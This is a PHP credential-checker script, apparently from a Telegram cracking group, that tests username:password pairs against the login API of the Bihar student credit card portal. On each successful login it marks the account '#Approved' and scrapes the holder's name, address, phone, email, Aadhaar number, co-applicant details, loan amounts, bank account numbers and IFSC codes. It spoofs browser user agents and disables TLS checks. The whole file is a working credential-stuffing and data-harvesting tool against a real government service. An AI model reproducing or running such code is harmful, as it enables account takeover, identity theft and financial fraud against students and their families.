<?php

#/// API Made By: @deepaikk 
#/// Channel & Chat: @BinBhai & @BinBhaiFamily | 🏴‍☠️【Bв™】
#/// Rest API
#/// Gate: [Bihar Student Credit Card]
#/// Total Requests: [03]
#/// Site: [https://www.bsefcl.bihar.gov.in/#/loginpage]

#---///Credits\\\---#

$credits = "[☠️【★Bв™】Bin Bhai]"; /// PUT YOUR NAME

#---///[I Am Using ProxyLess Checker Here]\\\---#

error_reporting(0);
set_time_limit(8); // ROCKET SPEED timeout
ini_set('memory_limit', '512M'); // Maximum memory for rocket speed
ini_set('max_execution_time', 8); // ROCKET execution time
ini_set('default_socket_timeout', 3); // ROCKET socket timeout
ob_start();

#---///[START]\\\---#

if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};

#---///A [0-0-0]\\\---#

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function Braintree($data = 36){
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
};

$Session_Id = Braintree();

$lista = $_GET['lista'];

// Clean the lista parameter - remove any URL parameters that might be included
$lista = str_replace('api.php?lista=', '', $lista);
$lista = str_replace('?lista=', '', $lista);

$credentials = explode(":", $lista);
$username = isset($credentials[0]) ? trim($credentials[0]) : '';
$password = isset($credentials[1]) ? trim($credentials[1]) : '';

if (empty($lista) || empty($username) || empty($password)) {
    echo '<div style="background: #f8d7da; color: #721c24; padding: 15px; border: 1px solid #f5c6cb; border-radius: 5px; margin: 10px 0;">';
    echo '<strong>#Rejected</strong> 『 ★ Please Enter Valid Credentials ★ 』<br>';
    echo '<small>Checker Made By: '.$credits.'</small>';
    echo '</div>';
    die();
};

$User_Agent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11, 99).'';

#---///1st Request [Set-Cookie]>>>GET METHOD<<<\\\---# [REMOVED FOR SPEED - Login API handles cookies]

#---///2nd Request [Login API]>>>POST METHOD<<<\\\---#

// Prepare JSON payload for login
$loginPayload = json_encode([
    "userName" => $username,
    "password" => $password
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bsefcl.bihar.gov.in/api//validateUser');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $loginPayload);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Accept: application/json, text/plain, */*',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// ROCKET SPEED optimizations
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1); // ROCKET connection
curl_setopt($ch, CURLOPT_TIMEOUT, 3); // ROCKET timeout
curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600); // Maximum DNS cache
curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
curl_setopt($ch, CURLOPT_MAXREDIRS, 0); // No redirects
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // No location following
curl_setopt($ch, CURLOPT_AUTOREFERER, false); // No auto referer
curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1); // HTTP/1.1 for speed
$result1 = curl_exec($ch);
curl_close($ch);

// Parse login response
$loginResponse = json_decode($result1, true);

// Handle different response formats
if (json_last_error() !== JSON_ERROR_NONE) {
    // If not valid JSON, check if it contains success indicators
    if (strpos($result1, 'Registration Id') !== false) {
        $loginStatus = '1';
        $loginMessage = 'Login successful - User profile found';
    } else {
        $loginStatus = '0';
        $loginMessage = 'Invalid response format: ' . substr($result1, 0, 100);
    }
} else {
$loginStatus = isset($loginResponse['status']) ? $loginResponse['status'] : '0';
$loginMessage = isset($loginResponse['message']) ? $loginResponse['message'] : 'Login failed';
}

if ($loginStatus == '1') {
    // Login successful, now get loan status
    $userId = $loginMessage; // The message contains the user ID
    
    // Display results
    echo '<div style="background: #d4edda; color: #155724; padding: 15px; border: 1px solid #c3e6cb; border-radius: 5px; margin: 10px 0;">';
    echo '<strong>#Approved</strong> 『 ★ Login Successful ★ 』<br>';
    echo '<small>User ID: '.$userId.'</small>';
    echo '</div>';
    
    // Prepare loan request status payload - correct format from browser session
    $loanReqStatusPayload = json_encode([
        "key" => "LOAN_REQ_STATUS",
        "bindParameters" => [
            "source_registrationid" => $userId,
            "ss_companyid" => "5000",
            "ss_module_id" => "1"
        ],
        "whereClause" => ""
    ]);
    
    #---///3rd Request [loanReqStatus]>>>POST METHOD<<<\\\---#
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.bsefcl.bihar.gov.in/api/loanRequestStatus');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $loanReqStatusPayload);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Accept: application/json, text/plain, */*',
        'Accept-Encoding: gzip, deflate, br, zstd',
        'Accept-Language: en-US,en;q=0.9',
        'Connection: keep-alive',
        'user-agent: '.$User_Agent.'',
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    // ROCKET SPEED optimizations
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600);
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    $result3 = curl_exec($ch);
    curl_close($ch);
    
    // Parse loan request status response
    $loanReqResponse = json_decode($result3, true);
    if ($loanReqResponse && isset($loanReqResponse['validation_status']) && $loanReqResponse['validation_status'] == 'Success' && isset($loanReqResponse['recordList']) && !empty($loanReqResponse['recordList'])) {
        echo '<div style="background: #d1ecf1; color: #0c5460; padding: 15px; border: 1px solid #bee5eb; border-radius: 5px; margin: 10px 0;">';
        echo '<strong>#Loan Request Status</strong> 『 ★ Status Retrieved ★ 』<br><br>';
        
        $loanData = $loanReqResponse['recordList'][0];
        
        if (isset($loanData['STAGE'])) {
            echo '<strong>Current Stage:</strong> <span style="color: #155724;">'.$loanData['STAGE'].'</span><br>';
        }
        if (isset($loanData['STATUS_OF_LOAN_REQUEST'])) {
            echo '<strong>Loan Request Status:</strong> <span style="color: #856404;">'.$loanData['STATUS_OF_LOAN_REQUEST'].'</span><br>';
        }
        if (isset($loanData['APPROVED_LOAN_AMOUNT'])) {
            echo '<strong>Approved Amount:</strong> <span style="color: #0c5460;">₹'.$loanData['APPROVED_LOAN_AMOUNT'].'</span><br>';
        }
        if (isset($loanData['REQUESTED_LOAN_AMOUNT'])) {
            echo '<strong>Requested Amount:</strong> <span style="color: #856404;">₹'.$loanData['REQUESTED_LOAN_AMOUNT'].'</span><br>';
        }
        if (isset($loanData['LOAN_APPROVED_DATE'])) {
            echo '<strong>Loan Approved Date:</strong> <span style="color: #721c24;">'.$loanData['LOAN_APPROVED_DATE'].'</span><br>';
        }
        if (isset($loanData['SOURCE_REGISTRATIONID'])) {
            echo '<strong>Registration ID:</strong> <span style="color: #155724;">'.$loanData['SOURCE_REGISTRATIONID'].'</span><br>';
        }
        if (isset($loanData['STATUS_OF_DISBURSED_LOAN'])) {
            echo '<strong>Disbursement Status:</strong> <span style="color: #0c5460;">'.$loanData['STATUS_OF_DISBURSED_LOAN'].'</span><br>';
        }
        
        echo '</div>';
    } else {
        echo '<div style="background: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin: 10px 0;">';
        echo '<strong>#Loan Request Status Not Available</strong> 『 ★ No Loan Data Found ★ 』<br>';
        if (isset($loanReqResponse['errorMessage']) && $loanReqResponse['errorMessage']) {
            echo '<small>Error: '.htmlspecialchars($loanReqResponse['errorMessage']).'</small>';
        }
        echo '</div>';
    }
    
    // Fetch Profile Summary Data - Use fastest endpoint only
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.bsefcl.bihar.gov.in/api/'.$userId);
    curl_setopt($ch, CURLOPT_HTTPGET, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: application/json',
        'user-agent: '.$User_Agent
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600);
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    $profileResult = curl_exec($ch);
    curl_close($ch);
    
    // Parse profile summary response
    $profileData = json_decode($profileResult, true);
    
    // Check for different response formats
    $isValidProfile = false;
    if ($profileData) {
        // Check for validationStatus field
        if (isset($profileData['validationStatus']) && $profileData['validationStatus'] == '1') {
            $isValidProfile = true;
        }
        // Check for validation_status field (alternative format)
        elseif (isset($profileData['validation_status']) && $profileData['validation_status'] == 'Success') {
            $isValidProfile = true;
        }
        // Check if we have profile data directly (some APIs return data without validation field)
        elseif (isset($profileData['name']) || isset($profileData['address']) || isset($profileData['phoneNo'])) {
            $isValidProfile = true;
        }
    }
    
    
    if ($isValidProfile) {
        echo '<div style="background: #e8f5e8; color: #2d5a2d; padding: 20px; border: 2px solid #4caf50; border-radius: 8px; margin: 15px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">';
        echo '<h4 style="color: #1b5e20; margin-bottom: 20px; border-bottom: 2px solid #4caf50; padding-bottom: 10px;">';
        echo '<i class="bi bi-person-badge" style="margin-right: 8px;"></i>Profile Summary';
        echo '</h4>';
        
        
        echo '<div style="display: grid; grid-template-columns: 1fr 2fr; gap: 10px; font-size: 14px;">';
        
        // Main applicant details
        if (isset($profileData['name'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Name:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['name']).'</div>';
        }
        
        if (isset($profileData['address'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Address:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['address']).'</div>';
        }
        
        if (isset($profileData['phoneNo'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Phone number:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['phoneNo']).'</div>';
        }
        
        if (isset($profileData['emailId'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Email id:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['emailId']).'</div>';
        }
        
        // Co-applicant details
        if (isset($profileData['coApplicantName'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Co_Applicant Name:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['coApplicantName']).'</div>';
        }
        
        if (isset($profileData['coApplicantAddress'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Co_Applicant Address:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['coApplicantAddress']).'</div>';
        }
        
        if (isset($profileData['coappContact'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Co-Applicant Contact:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['coappContact']).'</div>';
        }
        
        // Additional details
        if (isset($profileData['aadhaarNo'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Aadhaar Number:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['aadhaarNo']).'</div>';
        }
        
        if (isset($profileData['courseName'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Course Name:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['courseName']).'</div>';
        }
        
        if (isset($profileData['instituteName'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Institute Name:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['instituteName']).'</div>';
        }
        
        if (isset($profileData['courseDuration'])) {
            echo '<div style="font-weight: bold; color: #1b5e20;">Course Duration:</div>';
            echo '<div style="color: #2d5a2d;">'.htmlspecialchars($profileData['courseDuration']).' months</div>';
        }
        
        echo '</div>';
        echo '</div>';
    } else {
        echo '<div style="background: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin: 10px 0;">';
        echo '<strong>#Profile Summary Not Available</strong> 『 ★ Profile Data Not Found ★ 』<br>';
        
        echo '</div>';
    }
    
    // Fetch Account Summary Data
    $accountSummaryPayload = json_encode([
        "key" => "ACCOUNT_SUMMARY",
        "whereClause" => "",
        "bindParameters" => [
            "source_registrationid" => $userId,
            "ss_companyid" => "5000",
            "ss_module_id" => "1"
        ]
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.bsefcl.bihar.gov.in/api/accountSummary');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $accountSummaryPayload);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Accept: application/json, text/plain, */*',
        'Accept-Encoding: gzip, deflate, br, zstd',
        'Accept-Language: en-US,en;q=0.9',
        'Connection: keep-alive',
        'user-agent: '.$User_Agent.'',
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    // ROCKET SPEED optimizations
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600);
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    $accountResult = curl_exec($ch);
    curl_close($ch);
    
    // Parse account summary response
    $accountData = json_decode($accountResult, true);
    if ($accountData && isset($accountData['validation_status']) && $accountData['validation_status'] == 'Success' && isset($accountData['recordList']) && !empty($accountData['recordList'])) {
        echo '<div style="background: #e3f2fd; color: #0d47a1; padding: 20px; border: 2px solid #2196f3; border-radius: 8px; margin: 15px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">';
        echo '<h4 style="color: #0d47a1; margin-bottom: 20px; border-bottom: 2px solid #2196f3; padding-bottom: 10px;">';
        echo '<i class="bi bi-bank" style="margin-right: 8px;"></i>Account Summary';
        echo '</h4>';
        
        $accountInfo = $accountData['recordList'][0];
        
        // Calculate totals
        $totalSanctioned = isset($accountInfo['Sanction_Loan_Amount']) ? number_format($accountInfo['Sanction_Loan_Amount']) : '0';
        $totalDisbursed = isset($accountInfo['Disbursed_Loan_Amount']) ? number_format($accountInfo['Disbursed_Loan_Amount']) : '0';
        
        echo '<div style="overflow-x: auto;">';
        echo '<table style="width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">';
        
        // Table header
        echo '<thead style="background: linear-gradient(135deg, #1976d2 0%, #2196f3 100%); color: white;">';
        echo '<tr>';
        echo '<th style="padding: 15px; text-align: left; font-weight: 600; border: none;">Loan Account Number</th>';
        echo '<th style="padding: 15px; text-align: right; font-weight: 600; border: none;">Loan Sanctioned (₹)</th>';
        echo '<th style="padding: 15px; text-align: right; font-weight: 600; border: none;">Loan Disbursed</th>';
        echo '<th style="padding: 15px; text-align: center; font-weight: 600; border: none;">Repayment Tenure (Months)</th>';
        echo '</tr>';
        echo '</thead>';
        
        // Table body
        echo '<tbody>';
        echo '<tr style="border-bottom: 1px solid #e0e0e0;">';
        echo '<td style="padding: 15px; font-weight: 600; color: #1976d2;">'.(isset($accountInfo['Loan_Number']) ? htmlspecialchars($accountInfo['Loan_Number']) : 'N/A').'</td>';
        echo '<td style="padding: 15px; text-align: right; font-weight: 600; color: #2e7d32;">₹'.(isset($accountInfo['Sanction_Loan_Amount']) ? number_format($accountInfo['Sanction_Loan_Amount']) : '0').'</td>';
        echo '<td style="padding: 15px; text-align: right; font-weight: 600; color: #f57c00;">₹'.(isset($accountInfo['Disbursed_Loan_Amount']) ? number_format($accountInfo['Disbursed_Loan_Amount']) : '0').'</td>';
        echo '<td style="padding: 15px; text-align: center; font-weight: 600; color: #7b1fa2;">'.(isset($accountInfo['Sanction_Tenure_In_Months']) ? htmlspecialchars($accountInfo['Sanction_Tenure_In_Months']) : 'N/A').'</td>';
        echo '</tr>';
        
        // Total row
        echo '<tr style="background: #f5f5f5; font-weight: bold;">';
        echo '<td style="padding: 15px; color: #424242;">Total</td>';
        echo '<td style="padding: 15px; text-align: right; color: #2e7d32;">₹'.$totalSanctioned.'</td>';
        echo '<td style="padding: 15px; text-align: right; color: #f57c00;">₹'.$totalDisbursed.'</td>';
        echo '<td style="padding: 15px; text-align: center; color: #7b1fa2;">-</td>';
        echo '</tr>';
        echo '</tbody>';
        echo '</table>';
        echo '</div>';
        
        
        echo '</div>';
    } else {
        echo '<div style="background: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin: 10px 0;">';
        echo '<strong>#Account Summary Not Available</strong> 『 ★ Account Data Not Found ★ 』<br>';
        if (isset($accountData['errorMessage']) && $accountData['errorMessage']) {
            echo '<small>Error: '.htmlspecialchars($accountData['errorMessage']).'</small>';
        }
        echo '</div>';
    }
    
    // Fetch Disbursement Details Data - Use fastest payload format only
    $disbursementPayload = json_encode([
        "key" => "DISBURSEMENT_DTL",
        "whereClause" => "",
        "bindParameters" => [
            "source_registrationid" => $userId,
            "ss_companyid" => "5000",
            "ss_module_id" => "1"
        ]
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.bsefcl.bihar.gov.in/api/disbursementDetails');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $disbursementPayload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Accept: application/json',
        'user-agent: '.$User_Agent
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 600);
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    $disbursementResult = curl_exec($ch);
curl_close($ch);
    
    // Parse disbursement details response
    $disbursementData = json_decode($disbursementResult, true);
    // Check for different response formats
    $isValidDisbursement = false;
    if ($disbursementData) {
        // Check for validation_status field
        if (isset($disbursementData['validation_status']) && $disbursementData['validation_status'] == 'Success' && isset($disbursementData['recordList']) && !empty($disbursementData['recordList'])) {
            $isValidDisbursement = true;
        }
        // Check for validationStatus field (alternative format)
        elseif (isset($disbursementData['validationStatus']) && $disbursementData['validationStatus'] == '1' && isset($disbursementData['recordList']) && !empty($disbursementData['recordList'])) {
            $isValidDisbursement = true;
        }
        // Check if we have disbursement data directly (some APIs return data without validation field)
        elseif (isset($disbursementData['recordList']) && !empty($disbursementData['recordList'])) {
            $isValidDisbursement = true;
        }
        // Check if we have any disbursement-related data
        elseif (isset($disbursementData['data']) && !empty($disbursementData['data'])) {
            $disbursementData['recordList'] = $disbursementData['data'];
            $isValidDisbursement = true;
        }
        // Check if the response contains disbursement data in any format
        elseif (is_array($disbursementData) && !empty($disbursementData)) {
            // Look for any array that might contain disbursement records
            foreach ($disbursementData as $key => $value) {
                if (is_array($value) && !empty($value)) {
                    // Check if this looks like a record list
                    $firstItem = reset($value);
                    if (is_array($firstItem) && (isset($firstItem['ACCOUNT_NUMBER']) || isset($firstItem['Account_no']) || isset($firstItem['AMOUNT_PAID_TO']))) {
                        $disbursementData['recordList'] = $value;
                        $isValidDisbursement = true;
                        break;
                    }
                }
            }
        }
    }
    
    if ($isValidDisbursement) {
        echo '<div style="background: #f3e5f5; color: #4a148c; padding: 20px; border: 2px solid #9c27b0; border-radius: 8px; margin: 15px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">';
        echo '<h4 style="color: #4a148c; margin-bottom: 20px; border-bottom: 2px solid #9c27b0; padding-bottom: 10px;">';
        echo '<i class="bi bi-cash-stack" style="margin-right: 8px;"></i>Disbursement Details';
        echo '</h4>';
        
        echo '<div style="overflow-x: auto;">';
        echo '<table style="width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">';
        
        // Table header
        echo '<thead style="background: linear-gradient(135deg, #7b1fa2 0%, #9c27b0 100%); color: white;">';
        echo '<tr>';
        echo '<th style="padding: 15px; text-align: center; font-weight: 600; border: none;">Sr No.</th>';
        echo '<th style="padding: 15px; text-align: left; font-weight: 600; border: none;">Beneficiary Names</th>';
        echo '<th style="padding: 15px; text-align: left; font-weight: 600; border: none;">Account No</th>';
        echo '<th style="padding: 15px; text-align: left; font-weight: 600; border: none;">IFSC Code</th>';
        echo '<th style="padding: 15px; text-align: right; font-weight: 600; border: none;">Loan Disbursed</th>';
        echo '</tr>';
        echo '</thead>';
        
        // Table body
        echo '<tbody>';
        $totalDisbursed = 0;
        foreach ($disbursementData['recordList'] as $index => $disbursement) {
            $srNo = $index + 1;
            
            // Try multiple field names for beneficiary name
            $beneficiaryName = 'N/A';
            if (isset($disbursement['AMOUNT_PAID_TO'])) {
                $beneficiaryName = $disbursement['AMOUNT_PAID_TO'];
            } elseif (isset($disbursement['USER_NAME'])) {
                $beneficiaryName = $disbursement['USER_NAME'];
            } elseif (isset($disbursement['BENEFICIARY_NAME'])) {
                $beneficiaryName = $disbursement['BENEFICIARY_NAME'];
            } elseif (isset($disbursement['BENEFICIARY_NAMES'])) {
                $beneficiaryName = $disbursement['BENEFICIARY_NAMES'];
            }
            
            // Try multiple field names for account number
            $accountNo = 'N/A';
            if (isset($disbursement['ACCOUNT_NUMBER'])) {
                $accountNo = $disbursement['ACCOUNT_NUMBER'];
            } elseif (isset($disbursement['Account_no'])) {
                $accountNo = $disbursement['Account_no'];
            } elseif (isset($disbursement['ACCOUNT_NO'])) {
                $accountNo = $disbursement['ACCOUNT_NO'];
            }
            
            // Try multiple field names for IFSC code
            $ifscCode = 'N/A';
            if (isset($disbursement['IFSC_Code'])) {
                $ifscCode = $disbursement['IFSC_Code'];
            } elseif (isset($disbursement['IFSC_CODE'])) {
                $ifscCode = $disbursement['IFSC_CODE'];
            }
            
            // Try multiple field names for loan disbursed amount
            $loanDisbursed = '0';
            if (isset($disbursement['DISBURSE_LOAN_AMOUNT'])) {
                $loanDisbursed = $disbursement['DISBURSE_LOAN_AMOUNT'];
            } elseif (isset($disbursement['LOAN_DISBURSED'])) {
                $loanDisbursed = $disbursement['LOAN_DISBURSED'];
            } elseif (isset($disbursement['DISBURSED_AMOUNT'])) {
                $loanDisbursed = $disbursement['DISBURSED_AMOUNT'];
            }
            
            $totalDisbursed += floatval($loanDisbursed);
            
            echo '<tr style="border-bottom: 1px solid #e0e0e0;">';
            echo '<td style="padding: 15px; text-align: center; font-weight: 600; color: #7b1fa2;">'.$srNo.'</td>';
            echo '<td style="padding: 15px; font-weight: 600; color: #2e7d32;">'.htmlspecialchars($beneficiaryName).'</td>';
            echo '<td style="padding: 15px; font-weight: 600; color: #1976d2;">'.htmlspecialchars($accountNo).'</td>';
            echo '<td style="padding: 15px; font-weight: 600; color: #f57c00;">'.htmlspecialchars($ifscCode).'</td>';
            echo '<td style="padding: 15px; text-align: right; font-weight: 600; color: #d32f2f;">₹'.number_format($loanDisbursed).'</td>';
            echo '</tr>';
        }
        
        // Total row
        echo '<tr style="background: #f5f5f5; font-weight: bold;">';
        echo '<td style="padding: 15px; text-align: center; color: #424242;">Total</td>';
        echo '<td style="padding: 15px; color: #424242;">-</td>';
        echo '<td style="padding: 15px; color: #424242;">-</td>';
        echo '<td style="padding: 15px; color: #424242;">-</td>';
        echo '<td style="padding: 15px; text-align: right; color: #d32f2f;">₹'.number_format($totalDisbursed).'</td>';
        echo '</tr>';
        echo '</tbody>';
        echo '</table>';
        echo '</div>';
        
        
        echo '</div>';
    } else {
        echo '<div style="background: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin: 10px 0;">';
        echo '<strong>#Disbursement Details Not Available</strong> 『 ★ Disbursement Data Not Found ★ 』<br>';
        
        echo '</div>';
    }
    
} else {
    echo '<div style="background: #f8d7da; color: #721c24; padding: 15px; border: 1px solid #f5c6cb; border-radius: 5px; margin: 10px 0;">';
    echo '<strong>#Rejected</strong> 『 ★ Login Failed ★ 』<br>';
    echo '<strong>Message:</strong> '.htmlspecialchars($loginMessage).'<br><br>';
    
    echo '</div>';
    }


// ROCKET SPEED output optimizations
ob_end_flush();
flush(); // Force immediate output
@unlink('cookie.txt');

#---///[THE END]\\\---#

//sleep(3);

?>